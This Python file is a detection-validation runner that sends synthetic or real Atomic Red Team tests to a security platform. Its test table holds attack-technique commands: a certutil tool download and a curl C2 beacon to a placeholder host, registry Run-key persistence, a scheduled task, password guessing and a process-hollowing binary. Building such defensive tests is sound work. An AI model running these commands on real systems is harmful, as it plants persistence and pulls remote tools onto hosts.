"""
Atomic Red Team Test Runner for Cobalto Platform.

Runs Atomic Red Team tests against the Cobalto platform to validate
detection and response capabilities for MITRE ATT&CK techniques.
"""

import asyncio
import json
import subprocess
import yaml
from typing import Any, Dict, List, Optional
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
import httpx
import structlog

logger = structlog.get_logger(__name__)


class TestStatus(str, Enum):
    """Atomic test status."""
    PENDING = "pending"
    RUNNING = "running"
    PASSED = "passed"
    FAILED = "failed"
    SKIPPED = "skipped"
    ERROR = "error"


class TechniqueStatus(str, Enum):
    """Technique validation status."""
    NOT_TESTED = "not_tested"
    PARTIALLY_COVERED = "partially_covered"
    FULLY_COVERED = "fully_covered"
    DETECTED = "detected"
    NOT_DETECTED = "not_detected"


@dataclass
class AtomicTest:
    """Atomic Red Team test definition."""
    test_id: str
    name: str
    description: str
    technique_id: str
    executor: str = "command_prompt"
    supported_platforms: List[str] = field(default_factory=list)
    input_arguments: Dict[str, Any] = field(default_factory=dict)
    dependency_executor: Optional[str] = None
    dependencies: List[str] = field(default_factory=list)
    cleanup_commands: List[str] = field(default_factory=list)
    commands: List[str] = field(default_factory=list)


@dataclass
class TestResult:
    """Result of an atomic test execution."""
    test_id: str
    technique_id: str
    status: TestStatus
    alert_detected: bool = False
    alert_id: Optional[str] = None
    alert_severity: Optional[str] = None
    response_actions: List[str] = field(default_factory=list)
    detection_time_ms: Optional[float] = None
    response_time_ms: Optional[float] = None
    error_message: Optional[str] = None
    executed_at: Optional[datetime] = None
    completed_at: Optional[datetime] = None


@dataclass
class TechniqueCoverage:
    """MITRE technique coverage report."""
    technique_id: str
    technique_name: str
    status: TechniqueStatus
    tests_executed: int = 0
    tests_passed: int = 0
    alerts_detected: int = 0
    avg_detection_time_ms: float = 0.0
    avg_response_time_ms: float = 0.0
    recommendations: List[str] = field(default_factory=list)


# =============================================================================
# Common Atomic Tests by Technique
# =============================================================================

COMMON_ATOMIC_TESTS: Dict[str, List[AtomicTest]] = {
    # T1110 - Brute Force
    "T1110": [
        AtomicTest(
            test_id="T1110.001-1",
            name="Password Guessing - Failed Logons",
            description="Simulate brute force by generating failed logon events",
            technique_id="T1110.001",
            executor="command_prompt",
            supported_platforms=["windows"],
            commands=[
                'net use \\\\{password_spray_target} /user:{username} {wrong_password}'
            ],
            input_arguments={
                "password_spray_target": {"default": "127.0.0.1"},
                "username": {"default": "administrator"},
                "wrong_password": {"default": "WrongPassword123!"},
            },
        ),
    ],
    # T1059 - Command and Scripting Interpreter
    "T1059": [
        AtomicTest(
            test_id="T1059.001-1",
            name="PowerShell Commands",
            description="Execute PowerShell commands to test detection",
            technique_id="T1059.001",
            executor="powershell",
            supported_platforms=["windows"],
            commands=[
                "Get-Process | Out-File C:\\Temp\\process_list.txt",
                'Invoke-WebRequest -Uri "http://test.example.com" -OutFile C:\\Temp\\test.txt',
            ],
        ),
    ],
    # T1053 - Scheduled Task/Job
    "T1053": [
        AtomicTest(
            test_id="T1053.005-1",
            name="Scheduled Task Creation",
            description="Create a scheduled task to test detection",
            technique_id="T1053.005",
            executor="command_prompt",
            supported_platforms=["windows"],
            commands=[
                'schtasks /create /tn "AtomicTestTask" /tr "cmd.exe /c echo hello" /sc daily /st 09:00',
            ],
            cleanup_commands=[
                'schtasks /delete /tn "AtomicTestTask" /f',
            ],
        ),
    ],
    # T1547 - Boot or Logon Autostart Execution
    "T1547": [
        AtomicTest(
            test_id="T1547.001-1",
            name="Registry Run Key",
            description="Add registry run key for persistence",
            technique_id="T1547.001",
            executor="command_prompt",
            supported_platforms=["windows"],
            commands=[
                'reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v AtomicTest /d "C:\\Temp\\test.exe" /f',
            ],
            cleanup_commands=[
                'reg delete HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v AtomicTest /f',
            ],
        ),
    ],
    # T1071 - Application Layer Protocol
    "T1071": [
        AtomicTest(
            test_id="T1071.001-1",
            name="HTTP C2 Communication",
            description="Simulate HTTP-based C2 communication",
            technique_id="T1071.001",
            executor="command_prompt",
            supported_platforms=["windows", "linux", "macos"],
            commands=[
                'curl -s -o /dev/null http://test.example.com/beacon',
            ],
        ),
    ],
    # T1105 - Ingress Tool Transfer
    "T1105": [
        AtomicTest(
            test_id="T1105-1",
            name="Download Tool",
            description="Download a file using certutil",
            technique_id="T1105",
            executor="command_prompt",
            supported_platforms=["windows"],
            commands=[
                'certutil -urlcache -split -f http://test.example.com/tool.exe C:\\Temp\\tool.exe',
            ],
            cleanup_commands=[
                'del C:\\Temp\\tool.exe',
            ],
        ),
    ],
    # T1027 - Obfuscated Files or Information
    "T1027": [
        AtomicTest(
            test_id="T1027-1",
            name="Base64 Encoded Command",
            description="Execute base64 encoded command",
            technique_id="T1027",
            executor="powershell",
            supported_platforms=["windows"],
            commands=[
                'powershell -EncodedCommand RwBlAHQALQBQAHIAbwBjAGUAcwBzAA==',
            ],
        ),
    ],
    # T1055 - Process Injection
    "T1055": [
        AtomicTest(
            test_id="T1055-1",
            name="Process Hollowing",
            description="Create remote process with hollowing",
            technique_id="T1055",
            executor="command_prompt",
            supported_platforms=["windows"],
            commands=[
                'C:\\AtomicRedTeam\\atomics\\T1055\\bin\\T1055.exe',
            ],
        ),
    ],
    # T1082 - System Information Discovery
    "T1082": [
        AtomicTest(
            test_id="T1082-1",
            name="System Information Discovery",
            description="Execute system information discovery commands",
            technique_id="T1082",
            executor="command_prompt",
            supported_platforms=["windows"],
            commands=[
                "systeminfo",
                "hostname",
                "whoami /all",
            ],
        ),
    ],
    # T1018 - Remote System Discovery
    "T1018": [
        AtomicTest(
            test_id="T1018-1",
            name="Network Discovery",
            description="Execute network discovery commands",
            technique_id="T1018",
            executor="command_prompt",
            supported_platforms=["windows", "linux"],
            commands=[
                "net view",
                "arp -a",
                "ipconfig /all",
            ],
        ),
    ],
}


class AtomicRedTeamRunner:
    """Runner for Atomic Red Team tests."""

    def __init__(
        self,
        cobalto_api_url: str = "http://localhost:8000",
        wazuh_api_url: Optional[str] = None,
        test_timeout: int = 300,
    ):
        self.cobalto_api_url = cobalto_api_url
        self.wazuh_api_url = wazuh_api_url
        self.test_timeout = test_timeout
        self._results: List[TestResult] = []

    async def run_technique_test(
        self,
        technique_id: str,
        test: AtomicTest,
        simulate: bool = True,
    ) -> TestResult:
        """
        Run a single atomic test.
        
        If simulate=True, generates synthetic alerts instead of executing
        actual attack commands.
        """
        logger.info(
            "atomic_test_starting",
            technique_id=technique_id,
            test_id=test.test_id,
            simulate=simulate,
        )

        result = TestResult(
            test_id=test.test_id,
            technique_id=technique_id,
            status=TestStatus.RUNNING,
            executed_at=datetime.utcnow(),
        )

        try:
            if simulate:
                # Generate synthetic alert
                alert = self._generate_synthetic_alert(test)
                alert_id = await self._send_alert_to_cobalto(alert)
                result.alert_id = alert_id
            else:
                # Execute actual commands (use with caution)
                for command in test.commands:
                    process = await asyncio.create_subprocess_shell(
                        command,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                    )
                    await asyncio.wait_for(
                        process.communicate(),
                        timeout=self.test_timeout,
                    )

                # Wait for alert to be generated
                await asyncio.sleep(5)

            # Check if alert was detected
            detection_result = await self._check_alert_detection(result.alert_id)
            result.alert_detected = detection_result.get("detected", False)
            result.alert_severity = detection_result.get("severity")
            result.response_actions = detection_result.get("actions", [])

            if result.alert_detected:
                result.status = TestStatus.PASSED
            else:
                result.status = TestStatus.FAILED

        except asyncio.TimeoutError:
            result.status = TestStatus.ERROR
            result.error_message = "Test execution timed out"
        except Exception as e:
            result.status = TestStatus.ERROR
            result.error_message = str(e)

        result.completed_at = datetime.utcnow()
        self._results.append(result)

        logger.info(
            "atomic_test_completed",
            technique_id=technique_id,
            test_id=test.test_id,
            status=result.status.value,
            alert_detected=result.alert_detected,
        )

        return result

    def _generate_synthetic_alert(self, test: AtomicTest) -> Dict[str, Any]:
        """Generate synthetic alert for testing."""
        # Map technique to alert characteristics
        technique_alerts = {
            "T1110": {
                "rule_id": 5712,
                "rule_level": 8,
                "rule_description": "Multiple failed login attempts",
                "rule_groups": "authentication_failures",
            },
            "T1059": {
                "rule_id": 5712,
                "rule_level": 7,
                "rule_description": "Suspicious PowerShell execution",
                "rule_groups": "windows,powershell",
            },
            "T1053": {
                "rule_id": 5716,
                "rule_level": 7,
                "rule_description": "Scheduled task created",
                "rule_groups": "windows,scheduled_task",
            },
            "T1547": {
                "rule_id": 5718,
                "rule_level": 8,
                "rule_description": "Registry persistence mechanism detected",
                "rule_groups": "windows,persistence",
            },
            "T1071": {
                "rule_id": 5713,
                "rule_level": 6,
                "rule_description": "Suspicious HTTP connection detected",
                "rule_groups": "network,http",
            },
            "T1105": {
                "rule_id": 5714,
                "rule_level": 7,
                "rule_description": "File downloaded using certutil",
                "rule_groups": "windows,download",
            },
        }

        base_alert = technique_alerts.get(
            test.technique_id.split(".")[0],
            {
                "rule_id": 5712,
                "rule_level": 5,
                "rule_description": f"Atomic test: {test.name}",
                "rule_groups": "atomic_test",
            },
        )

        return {
            "alert_id": f"atomic-{test.test_id}",
            "source": "wazuh",
            "timestamp": datetime.utcnow().isoformat(),
            "rule": {
                "id": base_alert["rule_id"],
                "level": base_alert["rule_level"],
                "description": base_alert["rule_description"],
                "groups": base_alert["rule_groups"],
                "mitre": {
                    "technique": test.technique_id,
                    "tactic": self._get_tactic_for_technique(test.technique_id),
                },
            },
            "agent": {
                "id": "atomic-test-agent",
                "name": "atomic-test-host",
            },
            "network": {
                "src_ip": "192.168.1.100",
                "dst_ip": "10.0.0.1",
                "src_port": 4444,
                "dst_port": 443,
                "protocol": "tcp",
            },
            "raw": {
                "log": f"Atomic test execution: {test.name}",
                "data": {
                    "test_id": test.test_id,
                    "technique_id": test.technique_id,
                },
            },
        }

    def _get_tactic_for_technique(self, technique_id: str) -> str:
        """Get MITRE tactic for technique."""
        tactic_map = {
            "T1110": "credential-access",
            "T1059": "execution",
            "T1053": "execution",
            "T1547": "persistence",
            "T1071": "command-and-control",
            "T1105": "command-and-control",
            "T1027": "defense-evasion",
            "T1055": "defense-evasion",
            "T1082": "discovery",
            "T1018": "discovery",
        }
        return tactic_map.get(technique_id.split(".")[0], "unknown")

    async def _send_alert_to_cobalto(self, alert: Dict[str, Any]) -> str:
        """Send alert to Cobalto API."""
        async with httpx.AsyncClient() as client:
            response = await client.post(
                f"{self.cobalto_api_url}/webhook/wazuh",
                json={
                    "alert_id": alert["alert_id"],
                    "alert": alert,
                    "source": "atomic-red-team",
                    "metadata": {"test_mode": True},
                },
                timeout=30.0,
            )
            response.raise_for_status()
            data = response.json()
            return data.get("alert_id", alert["alert_id"])

    async def _check_alert_detection(
        self,
        alert_id: Optional[str],
    ) -> Dict[str, Any]:
        """Check if alert was detected by Cobalto."""
        if not alert_id:
            return {"detected": False}

        async with httpx.AsyncClient() as client:
            try:
                response = await client.get(
                    f"{self.cobalto_api_url}/api/alerts/{alert_id}",
                    timeout=10.0,
                )
                if response.status_code == 200:
                    data = response.json()
                    return {
                        "detected": True,
                        "severity": data.get("severity"),
                        "actions": data.get("response_actions", []),
                    }
            except Exception:
                pass

        return {"detected": False}

    async def run_technique_suite(
        self,
        technique_id: str,
        simulate: bool = True,
    ) -> List[TestResult]:
        """Run all tests for a technique."""
        tests = COMMON_ATOMIC_TESTS.get(technique_id, [])
        results = []

        for test in tests:
            result = await self.run_technique_test(technique_id, test, simulate)
            results.append(result)

        return results

    async def run_full_validation(
        self,
        techniques: Optional[List[str]] = None,
        simulate: bool = True,
    ) -> Dict[str, Any]:
        """Run full validation suite."""
        if techniques is None:
            techniques = list(COMMON_ATOMIC_TESTS.keys())

        all_results = []
        for technique_id in techniques:
            results = await self.run_technique_suite(technique_id, simulate)
            all_results.extend(results)

        # Calculate coverage
        coverage = self._calculate_coverage(all_results)

        return {
            "total_tests": len(all_results),
            "passed": sum(1 for r in all_results if r.status == TestStatus.PASSED),
            "failed": sum(1 for r in all_results if r.status == TestStatus.FAILED),
            "errors": sum(1 for r in all_results if r.status == TestStatus.ERROR),
            "coverage": coverage,
            "results": all_results,
        }

    def _calculate_coverage(
        self,
        results: List[TestResult],
    ) -> List[TechniqueCoverage]:
        """Calculate technique coverage from results."""
        technique_results: Dict[str, List[TestResult]] = {}
        for result in results:
            technique_id = result.technique_id.split(".")[0]
            if technique_id not in technique_results:
                technique_results[technique_id] = []
            technique_results[technique_id].append(result)

        coverage = []
        for technique_id, technique_results_list in technique_results.items():
            tests_executed = len(technique_results_list)
            tests_passed = sum(
                1 for r in technique_results_list
                if r.status == TestStatus.PASSED
            )
            alerts_detected = sum(
                1 for r in technique_results_list
                if r.alert_detected
            )

            detection_times = [
                r.detection_time_ms for r in technique_results_list
                if r.detection_time_ms
            ]
            avg_detection = (
                sum(detection_times) / len(detection_times)
                if detection_times else 0.0
            )

            response_times = [
                r.response_time_ms for r in technique_results_list
                if r.response_time_ms
            ]
            avg_response = (
                sum(response_times) / len(response_times)
                if response_times else 0.0
            )

            # Determine status
            if alerts_detected == tests_executed:
                status = TechniqueStatus.FULLY_COVERED
            elif alerts_detected > 0:
                status = TechniqueStatus.PARTIALLY_COVERED
            else:
                status = TechniqueStatus.NOT_DETECTED

            coverage.append(TechniqueCoverage(
                technique_id=technique_id,
                technique_name=self._get_technique_name(technique_id),
                status=status,
                tests_executed=tests_executed,
                tests_passed=tests_passed,
                alerts_detected=alerts_detected,
                avg_detection_time_ms=avg_detection,
                avg_response_time_ms=avg_response,
            ))

        return coverage

    def _get_technique_name(self, technique_id: str) -> str:
        """Get technique name from ID."""
        technique_names = {
            "T1110": "Brute Force",
            "T1059": "Command and Scripting Interpreter",
            "T1053": "Scheduled Task/Job",
            "T1547": "Boot or Logon Autostart Execution",
            "T1071": "Application Layer Protocol",
            "T1105": "Ingress Tool Transfer",
            "T1027": "Obfuscated Files or Information",
            "T1055": "Process Injection",
            "T1082": "System Information Discovery",
            "T1018": "Remote System Discovery",
        }
        return technique_names.get(technique_id, f"Technique {technique_id}")

    def get_results(self) -> List[TestResult]:
        """Get all test results."""
        return self._results

    def get_coverage_report(self) -> Dict[str, Any]:
        """Get coverage report."""
        coverage = self._calculate_coverage(self._results)
        return {
            "timestamp": datetime.utcnow().isoformat(),
            "total_techniques": len(coverage),
            "fully_covered": sum(
                1 for c in coverage
                if c.status == TechniqueStatus.FULLY_COVERED
            ),
            "partially_covered": sum(
                1 for c in coverage
                if c.status == TechniqueStatus.PARTIALLY_COVERED
            ),
            "not_detected": sum(
                1 for c in coverage
                if c.status == TechniqueStatus.NOT_DETECTED
            ),
            "avg_detection_time_ms": (
                sum(c.avg_detection_time_ms for c in coverage) / len(coverage)
                if coverage else 0.0
            ),
            "techniques": [
                {
                    "technique_id": c.technique_id,
                    "name": c.technique_name,
                    "status": c.status.value,
                    "tests_executed": c.tests_executed,
                    "alerts_detected": c.alerts_detected,
                    "avg_detection_time_ms": c.avg_detection_time_ms,
                }
                for c in coverage
            ],
        }


async def run_atomic_validation(
    cobalto_url: str = "http://localhost:8000",
    techniques: Optional[List[str]] = None,
    simulate: bool = True,
) -> Dict[str, Any]:
    """Run Atomic Red Team validation."""
    runner = AtomicRedTeamRunner(cobalto_api_url=cobalto_url)
    return await runner.run_full_validation(techniques, simulate)
